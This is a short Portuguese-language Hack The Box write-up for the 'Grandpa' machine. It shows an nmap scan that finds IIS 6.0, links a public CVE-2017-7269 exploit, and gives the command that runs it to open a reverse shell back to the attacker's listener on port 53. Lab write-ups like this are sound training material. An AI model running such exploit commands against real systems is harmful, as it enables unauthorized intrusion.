---
title:     "Hack The Box - Grandpa"
tags: [windows,easy]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/1.jpg)

## Enumeration

Iniciamos entao nossa enumeracao usando o nmap

```
┌─[✗]─[htb-an4kein☺parrot]─[/htb/grandpa]
└──╼ $sudo nmap -Pn -p- -sV -oN nmap/allports_tcp 10.10.10.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 18:43 UTC
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.31% done; ETC: 18:45 (0:00:05 remaining)
Nmap scan report for 10.10.10.14
Host is up (0.072s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Percebemos que existe apenas a porta 80 aberta, rodando uma servidor WEB na versao bem velha 

Lembro que na maquina [Granny](https://an4kein.github.io/hackthebox/2020/06/24/HTB-Granny/)  explorei uma versao identica, logo vou testar o exploit usado nela pra tentar obter exito.. 

***preference*** https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

Entao, executamos o exploit apos configurar nossa porta de preferencia para ficar escultando, eu escolhi a 53

`sudo python iis6-cve-2017-7269.py 10.10.10.14 80 10.10.14.36 53`

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/2.jpg)
